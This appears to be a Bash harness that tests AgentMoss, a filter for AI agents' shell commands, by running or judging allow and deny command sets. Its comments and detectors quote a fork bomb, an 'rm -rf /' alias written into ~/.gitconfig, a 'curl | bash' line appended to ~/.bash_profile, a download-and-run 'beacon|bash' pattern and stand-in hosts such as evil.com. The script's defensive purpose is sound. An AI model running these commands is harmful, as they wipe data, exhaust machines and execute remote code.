#!/usr/bin/env bash
# ============================================================================
# run_all.sh — 顺序执行 allow.sh / deny.sh 里的所有命令，统计通过率。
#
# !!! 使用边界与责任声明 !!!
# cases_exec 唯一用途：测试沙箱/AgentMoss 等能力，执行测试集可执行命令并统计
# 通过率。必须在完全清楚后果的前提下执行（不会因副作用导致财产/信息丢失）。
# 严禁用于其他任何场景（生产环境、真实业务系统、非沙箱测试等）。因范围外使用
# 或未充分评估后果导致的任何损失，本项目不承担责任。
#
# 用法：
#   bash run_all.sh                          # 执行并统计（deny 恶意命令默认 SKIP）
#   bash run_all.sh --no-exec                # 不真执行，只统计命令数
#   bash run_all.sh --yes                    # 跳过执行前确认
#   bash run_all.sh --allow-dangerous        # 真想执行 deny 恶意命令（需隔离沙箱，自担风险）
#   bash run_all.sh --run-fork-bomb          # 即使 --allow-dangerous 也**默认不执行** fork bomb；
#                                            # 必须显式加本参数才真执行 fork bomb（自担风险，
#                                            # fork bomb 会打爆容器资源导致沙箱重启）
#   bash run_all.sh --run-resource-abuse     # 同理：无限循环 / yes 刷屏这类资源滥用（非 fork bomb）
#                                            # 也**默认不执行**（即使 --allow-dangerous），必须显式加
#                                            # 本参数才真执行（自担风险）。两个开关互相独立。
#   bash run_all.sh --include-root-only      # 把 *-root-only.sh（需 root 权限的命令）也纳入执行与统计
#   bash run_all.sh --layer l1              # 只提取/统计 tests/cases/l1/ 用例（客户只买 L1 时用）
#   bash run_all.sh --use-agentmoss          # 【判定模式】命令集一条都不执行，改用已安装的
#                                            #  agent_moss 逐条判定，得到「加上 AgentMoss 之后」
#                                            #  的放行率/拦截率（可与默认模式的真执行基线对比）。
#                                            #  只需先装离线包（pip install --user）——不需要
#                                            #  prep.sh（判定前提自动补齐），说明见 README §九。
#                                            #  例（招行只买 L1）：bash run_all.sh --scenario bank
#                                            #     --layer l1 --use-agentmoss
#                                            #  --layer/--scenario/--agent 只在**生成**命令集时生效，
#                                            #  三个步骤要用同一套参数（沿用旧命令集时本脚本会提示）。
#
# 执行与防护机制：
#   - allow.sh：应放行的安全命令 → 默认真执行（验证 AgentMoss 放行）
#   - deny.sh：应拦截的恶意命令 → 默认全部 SKIP（不真执行，避免破坏系统）
#   - 加 --allow-dangerous 才真执行 deny 恶意命令（需隔离沙箱 + 自担风险）
#   - fork bomb（`:(){ :|:& };:` 等自复制命令）：即使 --allow-dangerous 也**默认 SKIP**——
#     一旦真执行会无限 fork 打爆容器 CPU/内存/进程数，timeout 杀不掉残留进程，
#     导致沙箱被 SIGKILL（exit 137）重启、数据重置。双层防护：is_fork_bomb 宽模式
#     匹配函数自复制特征（不依赖字面形态），对 allow/deny 全集合生效、先于
#     --allow-dangerous；唯一放行开关是 --run-fork-bomb（自担风险）。
#   - 资源滥用（非 fork bomb：`while true` 无限循环、`yes > /dev/null &` 刷屏等）：
#     同为**默认 SKIP**（即使 --allow-dangerous），放行开关 --run-resource-abuse。
#     其中 `&` 结尾的命令 timeout 兜不住（bash 立即返回 rc=0）→ 跑完留孤儿进程常驻
#     烧满一个核，run_all.sh 不做收割、clean.sh 也不清它——故与 fork bomb 同档防护。
#   - allow-root-only.sh / deny-root-only.sh：**需要 root 权限**才能成功执行的命令。
#     普通用户（如客户沙箱的 sandbox 用户）执行时被操作系统自身 Permission denied
#     拦截，与沙箱无关——默认**排除**，不计入通过率统计（避免把 OS 拦截误算成
#     沙箱拦截）。加 --include-root-only 才纳入执行，并作为独立标签单独统计。
#
# 输出：
#   - 每条命令的判定结果：PASS/FAIL 一律表示「是否符合预期」——Allow 集期望放行（rc=0），
#     Deny 集期望被拦（rc≠0，被沙箱/OS 拒绝）。所以 deny 命令**执行成功 = [FAIL 应拦未拦]**。
#   - 汇总：Allow 放行率 / Deny 拦截率（与 `--use-agentmoss` 判定模式的
#     「AgentMoss 放行率 / 拦截率」同口径，两种模式的数字可直接对照）。
#   - 分母 = 全部命令（只剔除 rc=127「命令不存在」）；**安全跳过（fork bomb / 资源滥用 /
#     未加 --allow-dangerous 的 deny）照常进分母并计 FAIL**——没执行 ≠ 拦住了，跳过只是保护
#     测试机，不代表有任何机制拦下了它。输出里会用"其中 N 条安全跳过未执行"标注它们。
# ============================================================================
set -uo pipefail

# 工具函数（提前定义：参数解析/生成校验/确认环节都要用。原来定义在靠后位置，
# 生成失败路径 L183 先调用 err_p 会 "command not found" 静默失败——挪到这里）。
warn_p() { echo -e "\033[33m[ warn ] $*\033[0m"; }
err_p()  { echo -e "\033[31m[ error ] $*\033[0m"; }
info_p() { echo -e "\033[36m[ info ] $*\033[0m"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NO_EXEC=0
YES=0
INCLUDE_ROOT_ONLY=0
SCENARIO_ID=""
AGENT_ID=""
LAYER=""
ALLOW_DANGEROUS=0
RUN_FORK_BOMB=0
RUN_RESOURCE_ABUSE=0
USE_AGENTMOSS=0
# 防吞 flag 解析：--scenario/--agent/--layer 若紧跟另一个 --flag（缺值写法）时，
# 旧版 `${2:-}` 会把该 flag 当值吞掉（如 `--scenario --allow-dangerous` → SCENARIO_ID=
# "--allow-dangerous"，确认/allow-dangerous 语义错位，ask 被挤掉）。这里显式校验：
# 缺值或下一个参数是 -- 开头 → 报错退出，绝不让 --flag 被静默吞掉。
parse_arg() {
    local flag="$1" val="$2"
    SHIFT=2
    if [ -z "$val" ]; then
        err_p "$flag 需要一个参数值（如 $flag <id>）"
        exit 2
    fi
    case "$val" in
        --*) err_p "$flag 的值不能是另一个参数（$val）——疑似漏传值，已阻止解析继续。"; exit 2 ;;
    esac
    ARG="$val"
}
ARG=""; SHIFT=1
# 单一 while 解析循环：所有参数在一个循环内用 $1/shift 消费，避免多个 for 循环
# 遍历 $@ 时被 --scenario/--agent 的 shift 2 破坏位置参数——否则
# `--allow-dangerous --scenario bank` 时 --allow-dangerous 会被 shift 挤掉，
# ALLOW_DANGEROUS 永远解析不到（deny 全部 SKIP 的 bug）。
while [ $# -gt 0 ]; do
    case "$1" in
        --no-exec) NO_EXEC=1; shift ;;
        --yes) YES=1; shift ;;
        --include-root-only) INCLUDE_ROOT_ONLY=1; shift ;;
        --allow-dangerous) ALLOW_DANGEROUS=1; shift ;;
        --run-fork-bomb) RUN_FORK_BOMB=1; shift ;;
        --run-resource-abuse) RUN_RESOURCE_ABUSE=1; shift ;;
        --use-agentmoss) USE_AGENTMOSS=1; shift ;;
        --scenario) want_arg=true; parse_arg "$1" "${2:-}"; SCENARIO_ID="$ARG"; shift "$SHIFT";;
        --scenario=*) SCENARIO_ID="${1#*=}"; shift ;;
        --agent) want_arg=true; parse_arg "$1" "${2:-}"; AGENT_ID="$ARG"; shift "$SHIFT";;
        --agent=*) AGENT_ID="${1#*=}"; shift ;;
        --layer) want_arg=true; parse_arg "$1" "${2:-}"; LAYER="$ARG"; shift "$SHIFT";;
        --layer=*) LAYER="${1#*=}"; shift ;;
        *) echo "未知参数: $1（支持 --no-exec / --yes / --use-agentmoss / --include-root-only / --allow-dangerous / --run-fork-bomb / --run-resource-abuse / --scenario <id> / --agent <id> / --layer l1|l2|l3）" >&2; shift ;;
    esac
done

# 颜色
PASS_COLOR="\033[32m"; FAIL_COLOR="\033[31m"; WARN_COLOR="\033[33m"; RESET="\033[0m"

# 资源滥用识别（fork bomb 之外的 CPU/进程耗尽形态）。与 fork bomb 同为**宽模式**
# （不依赖字面完整形态，看特征不看写法），覆盖两类：
#   1) 无出口的无限循环：`while true` / `while :` / `until false` / `for((;;))`——
#      timeout 能兜住，但兜住前把一个核跑满；**同一命令里出现 break/exit/return 即
#      视为有出口**（有界循环）不命中，避免误伤正常运维脚本（规则过宽 = 白丢覆盖）。
#   2) `yes` 刷屏：yes 在**命令位置**（行首或 `;`/`&&`/`|` 之后）后接重定向/后台/行尾
#      ——无界写设备或后台常驻把 CPU 打满；`yes | head -3` 这类有界消费不命中。
# 前缀只认命令位置（不含任意空白）：`echo "while true; do :; done"` 这类**引号内
# 字面量**不命中，避免误伤「字面量不该拦」的对照用例。
# 为什么默认 SKIP 而不是交给 timeout：`yes > /dev/null &` 尾部 `&` 让 bash 立即返回
# （rc=0），timeout 根本触发不了 → 留下孤儿进程常驻烧满一个核（实测确认：杀不掉、
# 也没有任何收割机制，run_all.sh 跑完不清理）。与 fork bomb 同属"跑完留残留"。
# 已知边界（与 is_fork_bomb 同粒度，刻意不做）：加了前缀/包了一层的写法不命中
# （`nohup yes …`、`bash -c "while true; …"`）。本函数是**保护测试机的安全网，
# 不是安全边界**——要做安全边界该在引擎规则里，不在这里。
is_resource_abuse() {
    local cmd="$1"
    # 1) 无出口的无限循环
    if printf '%s\n' "$cmd" | grep -Eq '(^|[;&|])[[:space:]]*(while[[:space:]]+(true|:)|until[[:space:]]+false)([[:space:]]|;|$)' \
       || printf '%s\n' "$cmd" | grep -Eq 'for[[:space:]]*\(\([[:space:]]*;[[:space:]]*;'; then
        printf '%s\n' "$cmd" | grep -Eq '\b(break|exit|return)\b' || return 0
    fi
    # 2) yes 刷屏（命令位置 + 重定向/后台/行尾）
    if printf '%s\n' "$cmd" | grep -Eq '(^|[;&|])[[:space:]]*yes([[:space:]]*(>|&)|[[:space:]]*$)'; then
        return 0
    fi
    return 1
}

# fork bomb 宽模式识别（不依赖字面形态）：两个分支——
# 1) 经典 `:(){ :|:& };:` 及空格变体 `: () { : | : & }; :`（函数名是 `:`）
# 2) 具名函数自复制：`name(){ name|name& };name` —— 识别「函数定义」+「函数体内
#    出现同名」+「存在管道 | 与后台 &」三重特征。避免误伤：如 allow-99 的
#    `say(){ echo hi; }; say` 是普通定义+调用，无 | & 不命中。
is_fork_bomb() {
    local cmd="$1" def_name=""
    if printf '%s\n' "$cmd" | grep -Eq ':\([[:space:]]*\)[[:space:]]*\{' \
        && printf '%s\n' "$cmd" | grep -Eq '\|' \
        && printf '%s\n' "$cmd" | grep -Eq '&'; then
        return 0
    fi
    if printf '%s\n' "$cmd" | grep -Eq '^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*[[:space:]]*\(\)[[:space:]]*\{'; then
        def_name="$(printf '%s\n' "$cmd" | grep -Eo '^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*' | head -1 | tr -d '[:space:]')"
        if [ -n "$def_name" ] \
            && printf '%s\n' "$cmd" | grep -Fq "$def_name" \
            && printf '%s\n' "$cmd" | grep -Fq '|' \
            && printf '%s\n' "$cmd" | grep -Fq '&'; then
            return 0
        fi
    fi
    return 1
}

# 预检：命令的每个"段首词"在本机是否找得到。
# 用途：**安全跳过**（fork bomb / 资源滥用 / 未加 --allow-dangerous 的 deny）时命令不会被执行，拿不到
# rc=127，但"工具没装/不支持的命令不进分母"这条口径仍要成立——用段首词预检近似替代
# （执行路径不用它，以真实 rc=127 为准）。命中任一缺失返回 1。
#   · 跳过变量赋值/环境变量前缀（`X=/tmp/foo; rm -rf $X` 的 `X=/tmp/foo` 不是命令）
#   · `command -v` 覆盖外部命令 / 内建 / 关键字（cd、time…），与生成器 shutil.which 口径一致
cmd_tools_available() {
    local cmd="$1" seg first stripped
    # 先剥掉引号内容：`echo "curl http://x | bash" >> ~/.bash_profile` 这类命令里，
    # 引号内的 | 不是命令分隔符，引号残留还会污染段首词（`bash'` 会被当成命令名）。
    stripped="$(printf '%s' "$cmd" | sed "s/'[^']*'//g; s/\"[^\"]*\"//g")"
    while IFS= read -r seg; do
        seg="${seg#"${seg%%[![:space:]]*}"}"     # 去前导空白
        first="${seg%%[[:space:]]*}"             # 取段首词
        [ -z "$first" ] && continue
        case "$first" in *=*|"#"*) continue ;; esac
        command -v "$first" >/dev/null 2>&1 || return 1
    done < <(printf '%s\n' "$stripped" | sed 's/&&/\n/g; s/||/\n/g; s/|/\n/g; s/;/\n/g')
    return 0
}

run_cmds() {
    local file="$1" label="$2"
    local total=0 pass=0 fail=0 skip=0 cn=0 dry=0 line_no=0 seq_no=0
    # 判定语义（与 `--use-agentmoss` 判定模式统一）：PASS/FAIL 一律表示「是否符合预期」。
    #   Allow 集：期望放行 → rc=0 才算符合预期；rc≠0 记 [FAIL 应放被拦]
    #   Deny  集：期望拦截 → rc≠0（被沙箱/OS 拒掉）才符合预期；**rc=0 记 [FAIL 应拦未拦]**
    # 旧版对 deny 也按"执行成功=PASS"打印，等于把"没拦住"显示成通过，且与判定模式的
    # 语义相反——两种模式的数字就没法直接对照了。
    local expect_block=0
    case "$label" in Deny|Deny-root-only) expect_block=1 ;; esac
    echo ""
    echo "========== $label ($(basename "$file")) =========="
    while IFS= read -r cmd; do
        line_no=$((line_no + 1))   # 文件真实行号（含空行/注释行）
        # 跳过空行与注释行（生成脚本头部的 #! 与 # 说明）
        [ -z "$cmd" ] && continue
        case "$cmd" in \#*) continue;; esac
        seq_no=$((seq_no + 1))     # 有效命令序号（仅非空非注释命令计数）
        # dry-run（--no-exec）：只打印命令，既不执行也不判定 → **不计入分子/分母**
        # （"没执行 ≠ 拦住了"）。放在 total++ 之前，避免再扣回去。
        if [ "$NO_EXEC" = "1" ]; then
            echo -e "${PASS_COLOR}[dry-run 未执行-不统计]${RESET} [L${line_no}#${seq_no}] $cmd"
            dry=$((dry + 1))
            continue
        fi
        total=$((total + 1))
        # fork bomb 防护（置于 allow-dangerous 判定【之前】：即使 --allow-dangerous，
        # fork bomb 也默认 SKIP——只有 --run-fork-bomb 这一个开关能放行，且对
        # allow/deny 全集合生效，不依赖命令属于哪一类）。fork bomb 一旦执行，
        # timeout 杀不掉残留子进程（实测杀父后残留进程继续 fork），延迟爆发打爆
        # 容器 CPU/内存/进程数，导致 k8s pod 被 SIGKILL（exit 137）重启、沙箱数据
        # 重置（客户沙箱已多次实测中招）。is_fork_bomb 用宽模式匹配（见函数定义），
        # 覆盖 `:(){ :|:& };:` / `function f() { f | f & }; f` 等函数自复制变体。
        if is_fork_bomb "$cmd"; then
            if [ "$RUN_FORK_BOMB" = "0" ]; then
                # 安全跳过（真执行会打爆容器），**但仍计入分母并计 FAIL（应拦未拦）**：
                # 没有任何机制拦住它，跳过只是保护测试机，不等于"拦住了"。
                # 不做"命令不存在"预检：fork bomb 是纯 bash 语法（`:` 函数 + 管道 + 后台），
                # 不需要任何外部工具，预检会把它按 `;`/`|` 切碎后误判成命令不存在。
                echo -e "${FAIL_COLOR}[FAIL 应拦未拦（fork bomb 安全跳过-未执行）]${RESET} [L${line_no}#${seq_no}] $cmd"
                skip=$((skip + 1)); fail=$((fail + 1))
                continue
            fi
        fi
        # 资源滥用防护（fork bomb 之外：无限循环 / yes 刷屏）——同样置于 allow-dangerous
        # 判定【之前】：即使 --allow-dangerous 也默认 SKIP，唯一放行开关是
        # --run-resource-abuse（自担风险）。理由见 is_resource_abuse 注释：`&` 结尾的
        # 命令 timeout 兜不住，跑完留孤儿进程常驻烧 CPU，clean.sh 也不清理它们。
        # 计数口径与 fork bomb 完全一致：跳过 ≠ 拦住了，照样进分母、计 FAIL。
        if is_resource_abuse "$cmd"; then
            if [ "$RUN_RESOURCE_ABUSE" = "0" ]; then
                echo -e "${FAIL_COLOR}[FAIL 应拦未拦（资源滥用安全跳过-未执行）]${RESET} [L${line_no}#${seq_no}] $cmd"
                skip=$((skip + 1)); fail=$((fail + 1))
                continue
            fi
        fi
        # 高危命令防护：deny.sh / deny-root-only.sh 默认不真执行恶意命令（只有保护测试机的意义），
        # 除非 --allow-dangerous（需隔离沙箱 + 自担风险）。allow 类全真执行。
        # 注意口径：**未执行 ≠ 拦住了**——没有任何机制拦下它们，所以计入分母并计 FAIL（应拦未拦），
        # 只是带上"安全跳过-未执行"标注，避免被误读成沙箱拦住了。
        if { [ "$label" = "Deny" ] || [ "$label" = "Deny-root-only" ]; } && \
           [ "$ALLOW_DANGEROUS" = "0" ]; then
            # 同上：未执行照样计 FAIL/进分母；只有"命令不存在"（预检）才剔除出分母。
            if ! cmd_tools_available "$cmd"; then
                cn=$((cn + 1)); total=$((total - 1))
                echo -e "${WARN_COLOR}[SKIP 命令不存在（未执行-预检）]${RESET} [L${line_no}#${seq_no}] $cmd"
            else
                echo -e "${FAIL_COLOR}[FAIL 应拦未拦（高危跳过-未执行）]${RESET} [L${line_no}#${seq_no}] $cmd"
                skip=$((skip + 1)); fail=$((fail + 1))
            fi
            continue
        fi
        # git config 命令前重置 ~/.gitconfig：deny 集里 `echo 'alias ghx=rm -rf /' >> ~/.gitconfig`
        # （deny-100）会追加无 section 头的非法行，污染 .gitconfig 导致后续
        # `git config --global ...`（deny-51）报 fatal: bad config line N。每条 git config
        # 命令执行前从 assets 恢复干净占位，保证其真实执行验证的是沙箱拦截而非前置污染。
        case "$cmd" in
            *"git config"*)
                if [ -f "$SCRIPT_DIR/assets/home/.gitconfig" ]; then
                    cp "$SCRIPT_DIR/assets/home/.gitconfig" ~/.gitconfig 2>/dev/null || true
                fi
                ;;
        esac
        # root-only 命令说明：这些命令需要 root 权限才能成功执行，普通用户（如客户
        # 沙箱的 sandbox 用户）会被操作系统自身 Permission denied 拦截——与沙箱无关。
        # 只有加 --include-root-only 才纳入（此时以 root 或配了 passwordless sudo 运行才有意义）。
        if [ "$label" = "Allow-root-only" ] || [ "$label" = "Deny-root-only" ]; then
            echo -e "${WARN_COLOR}[root-only 需 root 权限]${RESET} [L${line_no}#${seq_no}] $cmd"
        fi
        # 执行命令（超时保护 30s，避免恶意命令挂起）
        if timeout 30 bash -c "$cmd" > /tmp/am_exec_out.$$ 2>&1; then
            rc=0
        else
            rc=$?
        fi
        # command not found（rc=127，软件缺失如 crontab/docker/wget/nginx/php 等）：
        # 属客户环境差异，非命令本身失败——不计入总数/失败数，仅 warning，
        # 结束后统一说明（避免软件缺失拉低通过率、误导为沙箱拦截）。
        if [ "$rc" = "127" ]; then
            cn=$((cn + 1))
            total=$((total - 1))
            echo -e "${WARN_COLOR}[SKIP 命令不存在 rc=127]${RESET} [L${line_no}#${seq_no}] $cmd"
        elif [ "$expect_block" = "1" ]; then
            # Deny 集：期望被拦（rc≠0）
            if [ "$rc" != "0" ]; then
                echo -e "${PASS_COLOR}[PASS 已拦截 rc=$rc]${RESET} [L${line_no}#${seq_no}] $cmd"
                # 打印拦截原因（前 2 行）：确认是「沙箱/OS 拦截」（Permission denied 等），
                # 而不是命令自身报错（No such file / 参数错）——后者同样 rc≠0 但不是拦截。
                head -2 /tmp/am_exec_out.$$ 2>/dev/null | sed 's/^/    /'
                pass=$((pass + 1))
            else
                echo -e "${FAIL_COLOR}[FAIL 应拦未拦]${RESET} [L${line_no}#${seq_no}] $cmd"
                fail=$((fail + 1))
            fi
        else
            # Allow 集：期望放行（rc=0）
            if [ "$rc" = "0" ]; then
                echo -e "${PASS_COLOR}[PASS 已放行]${RESET} [L${line_no}#${seq_no}] $cmd"
                pass=$((pass + 1))
            else
                echo -e "${FAIL_COLOR}[FAIL 应放被拦 rc=$rc]${RESET} [L${line_no}#${seq_no}] $cmd"
                # 打印具体错误（前 2 行）——区分「沙箱/OS 拦截」（Permission denied 等）
                # 与「命令自身问题」（No such file / invalid input 等），否则客户只看
                # rc 码无法判断失败原因。文件每次执行覆盖，读到的正是本条命令的输出。
                head -2 /tmp/am_exec_out.$$ 2>/dev/null | sed 's/^/    /'
                fail=$((fail + 1))
            fi
        fi
    done < "$file"
    echo ""
    # 汇总口径：total = 分母（= 全部命令，只有 rc=127「命令不存在」被剔除）；
    #   pass = 符合预期（Allow 放行 / Deny 拦截）；fail = 不符合预期；
    #   skip = 其中"安全跳过未执行"的条数（**是 fail 的子集**，只用于说明"为什么没拦"——
    #          未执行 ≠ 拦住了，所以它们照样计 FAIL、照样进分母）。
    # 措辞随集合区分，避免 deny 集的「通过」被误读成「命令执行成功」。
    if [ "$skip" -gt 0 ]; then
        _skip_note="，其中 $skip 条安全跳过未执行"
    else
        _skip_note=""
    fi
    if [ "$dry" -gt 0 ]; then
        # dry-run：没有任何执行/判定结果可统计，明说"不计数"，不给出 0/N 的假象
        echo "---- $label 结果：dry-run 打印 $dry 条命令（未执行、未判定，不计入统计）----"
    elif [ "$expect_block" = "1" ]; then
        echo "---- $label 结果：$pass 已拦截 / $total 总（未拦截 $fail$_skip_note，命令不存在 $cn）----"
    else
        echo "---- $label 结果：$pass 已放行 / $total 总（被拦 $fail$_skip_note，命令不存在 $cn）----"
    fi
    # 阶段完成，立即持久化汇总（防止后续 deny 阶段把系统跑挂时 allow 结果丢失）。
    echo "$label $pass $total $fail $skip $cn" > "/tmp/am_exec_summary.$$"
    echo "$label $pass $total $fail $skip $cn" >> "/tmp/am_exec_summary_all.$$"
}

# ---------- 本模式要哪一套命令集（两种模式的命令**内容不同**，不能互相沿用）----------
#   执行模式（默认，prep.sh 同）：加 -u，把外部域名重写成真实可连通的地址。用例里的
#     evil.com / c2.example 等是保留域，真跑 curl/wget 解析不了，命令失败会被当成
#     「沙箱拦住了」——基线通过率失真。
#   AgentMoss 判定模式（--use-agentmoss）：**不执行任何命令**，URL 能不能连通无关紧要；
#     而重写会改变规则看到的语义，导致误判：
#       ① 内网域被写成外网域：`curl -T … http://ci.internal.company/upload`（内部传输，
#          应放行）→ `https://www.example.com`（外网，外传规则拦截）；
#          `--registry https://registry.npmjs.org`（官方源，应放行）→ 非标准源（拦截）。
#       ② URL 子路径被丢弃：`…/beacon|bash`（下载后执行）→ 根路径，「下载后执行」规则
#          再也命中不到（应拦未拦）。
#     故判定必须用**用例原始命令**，即不传 -u。
# 生成器把用的是哪种写进文件头（`# URL 重写: 开/关`），据此判断现存的命令集能否沿用。
CMD_MODE="exec"; [ "$USE_AGENTMOSS" = "1" ] && CMD_MODE="judge"
WANT_RW="开"; [ "$CMD_MODE" = "judge" ] && WANT_RW="关"
HAVE_RW=""
if [ -f "$SCRIPT_DIR/allow.sh" ]; then
    HAVE_RW="$(sed -n 's/^# URL 重写: \(开\|关\).*/\1/p' "$SCRIPT_DIR/allow.sh" 2>/dev/null | head -1)"
fi

# 生成器 URL 重写参数：只有真执行模式需要（原因见上）。单独成函数是为了让测试能直接
# source 调用做决策表断言（见 tests/test_cases_exec_smoke.py）；$1 = 模式（exec/judge）。
gen_rewrite_args() {
    if [ "$1" = "judge" ]; then
        return 0
    fi
    printf '%s\n' "-u" "$URL_BASE"
}

# 现存的命令集能否直接沿用：0 = 需要重建，1 = 可以直接用。
# 判据全部取自上面的全局（CMD_MODE / WANT_RW / HAVE_RW / NO_EXEC），与生成段同一份来源。
# 同样单独成函数是为了可测——这几条判据任一条写反都会「静默串台」（判定拿到重写集 →
# 误判；执行拿到原始集 → curl/wget 全连不通 → 基线失真），而且不报错，只能靠看护测试。
cmdset_needs_regen() {
    [ "$NO_EXEC" = "1" ] && return 0          # --no-exec：重建本模式要用的那套（dry-run
                                              #   预览的必须是本模式真要跑的命令）
    [ "$CMD_MODE" = "judge" ] && return 0     # 判定模式每次重建：--layer/--scenario/--agent
                                              #   一定生效，绝不沿用上次另一套参数生成的
    [ "$HAVE_RW" != "$WANT_RW" ] && return 0  # 现存的是另一种模式（或旧格式无标记）→ 不能沿用
    return 1
}

# 生成 allow.sh / deny.sh。判定模式每次都重建（保证 --layer/--scenario/--agent 一定生效，
# 不会沿用上次别的参数生成的一套）；执行模式沿用现存的，但**只认执行模式自己生成的那套**
# （文件头 URL 重写: 开）——否则会拿到判定用的原始命令去真执行，curl/wget 全连不通。
if [ ! -f "$SCRIPT_DIR/allow.sh" ] || cmdset_needs_regen; then
    # 生成器：唯一来源是 cases_exec 同目录（随 tests 分发；仓库 scripts/ 冗余副本已删）
    GENERATOR="$SCRIPT_DIR/generate_bash_exc.py"
    if [ -f "$GENERATOR" ]; then
        CASES_DIR="$(cd "$SCRIPT_DIR/.." && pwd)/cases"
        # 与 prep.sh 保持一致：展开 AM_YOUR_HOME（不再额外 sed AM_YOUR_HOME——避免重复
        # 展开把 /home/ 误改为 /hoe/）。
        # --scenario/--agent：在通用集基础上【追加】对应子目录用例（默认不指定时
        # 跳过 agent/scenario 子目录；指定时通用 l1/l2/l3 用例保留、追加对应子目录）。
        # --layer：只提取 tests/cases/<l>/ 子目录（客户只买 L1 时交付物只含 L1 用例）。
        URL_BASE="${AM_EXEC_URL_BASE:-https://www.example.com}"
        GEN_EXTRA=()
        if [ -n "$SCENARIO_ID" ]; then GEN_EXTRA+=(--scenario "$SCENARIO_ID"); fi
        if [ -n "$AGENT_ID" ]; then GEN_EXTRA+=(--agent "$AGENT_ID"); fi
        if [ -n "$LAYER" ]; then GEN_EXTRA+=(--layer "$LAYER"); fi
        mapfile -t GEN_RW < <(gen_rewrite_args "$CMD_MODE")
        # --layer 校验在生成器内做（未知层名启动即报错 fail-fast）。
        # 生成器的 [warn] 必须透出来（其余输出仍丢弃，保持跑测输出干净）：命令集是按**本机
        # 环境**生成的（家目录展开进命令），条数会随环境变——例如 bank 白名单只认
        # /home/sandbox，家目录不是它的机器会有几条 allow 命令被场景规则剔除。静默吞掉就会
        # 变成「同一个包、两个环境、数字对不上，还每次都一样」，客户无从查起（2026-09 实测）。
        GEN_OUT="$(python3 "$GENERATOR" --json-dir "$CASES_DIR" --output-dir "$SCRIPT_DIR" \
            --expand-user-home "${GEN_RW[@]}" "${GEN_EXTRA[@]}" 2>&1)"
        while IFS= read -r _gen_line; do
            case "$_gen_line" in "[warn]"*) warn_p "${_gen_line#\[warn\] }" ;; esac
        done <<< "$GEN_OUT"
        if [ "$CMD_MODE" = "judge" ]; then
            info_p "命令集已按【AgentMoss 判定】重建：不重写 URL，判用例原始命令。"
        fi
    fi
    # 生成失败必须 fail-fast：allow.sh/deny.sh 是执行统计的唯一输入，静默带病继续会让
    # 客户跑完统计全为 0 且不明原因（python3 缺失 / 用例 JSON 异常）。提示用 prep.sh 重跑。
    if [ ! -f "$SCRIPT_DIR/allow.sh" ]; then
        err_p "生成 allow.sh/deny.sh 失败（python3 缺失或生成器异常），没有命令集可执行——"
        err_p "  请安装 python3 后重跑：bash prep.sh（或直接重跑 run_all.sh）。"
        exit 1
    fi
elif [ -n "$LAYER" ] || [ -n "$SCENARIO_ID" ] || [ -n "$AGENT_ID" ]; then
    # 命令集已存在 → 沿用不再生成（分支只在**执行模式**可达：判定模式每次都重建，参数
    # 一定生效）。但 --layer/--scenario/--agent 只在**生成时**生效：沿用旧命令集会让参数
    # 与实际用例集不一致（例如先按全集跑过一轮，再加 --layer l1 跑，统计口径仍是全集——
    # 数字对不上但没有任何提示）。显式说明并提供重建命令。
    _hint=""
    [ -n "$SCENARIO_ID" ] && _hint="$_hint --scenario $SCENARIO_ID"
    [ -n "$AGENT_ID" ] && _hint="$_hint --agent $AGENT_ID"
    [ -n "$LAYER" ] && _hint="$_hint --layer $LAYER"
    warn_p "沿用已存在的 allow.sh/deny.sh（未重新生成）——本次的 --layer/--scenario/--agent 只在生成时生效。"
    warn_p "  如需按当前参数重建命令集：bash prep.sh$_hint（或删除 allow.sh/deny.sh 后重跑）。"
fi

# ---------- 模式二：--use-agentmoss（不执行任何命令，只用 AgentMoss 判定）----------
# 与默认模式（沙箱真执行，统计「不使用 AgentMoss」的基线通过率）相对：
# 本模式把同一份 allow.sh / deny.sh 的每条命令交给**已安装的 agent_moss** 用 import 方式
# 逐条判定（allow 期望放行 / deny 期望拦截），得到「加上 AgentMoss 之后」的通过率。
# 判定不跑 shell → 不需要 prep.sh 的真执行环境（家目录场景/样本/HTTP 服务），也**不需要先跑
# prep.sh**：判某几条 deny 命令要用的前提文件（cwd 下的 deploy.sh/.env 等）由 judge 从
# assets/premise/ 自动补齐（只补缺失不覆盖；加 --no-premise 可关）。
# 因为不执行任何命令，这里不做「危险命令确认」——直接进判定。
if [ "$USE_AGENTMOSS" = "1" ]; then
    JUDGE="$SCRIPT_DIR/judge_agentmoss.py"
    if [ ! -f "$JUDGE" ]; then
        err_p "缺少 $JUDGE —— 该脚本随 tests 目录分发，请确认 tests/ 完整（未丢失文件）。"
        exit 1
    fi
    if [ "$ALLOW_DANGEROUS" = "1" ] || [ "$RUN_FORK_BOMB" = "1" ] || [ "$RUN_RESOURCE_ABUSE" = "1" ]; then
        warn_p "--allow-dangerous / --run-fork-bomb / --run-resource-abuse 在 --use-agentmoss 模式下无效：本模式不执行任何命令。"
    fi
    if [ "$NO_EXEC" = "1" ]; then
        warn_p "--no-exec 在 --use-agentmoss 模式下无意义（本模式本来就不执行命令）。"
    fi
    JUDGE_ARGS=(--dir "$SCRIPT_DIR")
    # --scenario/--agent 必须与生成命令集时一致（判定要透传 scenario_id/agent_id 才能命中定制规则）。
    [ -n "$SCENARIO_ID" ] && JUDGE_ARGS+=(--scenario "$SCENARIO_ID")
    [ -n "$AGENT_ID" ] && JUDGE_ARGS+=(--agent "$AGENT_ID")
    # --layer 透传：--layer l1 时 judge 自动设 AGENT_MOSS_DISABLE_LOGIC_RULES=1，
    # 引擎口径对齐客户 L1-only 形态（验收数字不因 L2 命中虚高）。
    [ -n "$LAYER" ] && JUDGE_ARGS+=(--layer "$LAYER")
    [ "$INCLUDE_ROOT_ONLY" = "1" ] && JUDGE_ARGS+=(--include-root-only)
    cd "$SCRIPT_DIR"
    python3 "$JUDGE" "${JUDGE_ARGS[@]}"
    exit $?
fi

# ---------- 执行前警告 + 使用边界声明 ----------
echo ""
echo -e "\033[1;31m============================================================"
echo "  执 行 前 警 告 与 使 用 边 界"
echo "============================================================\033[0m"
warn_p "cases_exec 唯一用途：测试沙箱/AgentMoss 等能力，执行测试集可执行命令并统计通过率。仅此场景。"
if [ "$NO_EXEC" = "1" ]; then
    err_p "已加 --no-exec：当前为 dry-run 模式，只打印命令【不真执行】——allow/deny 全部不执行！"
fi
warn_p "allow.sh 的命令是安全命令，可真实执行（验证放行）。"
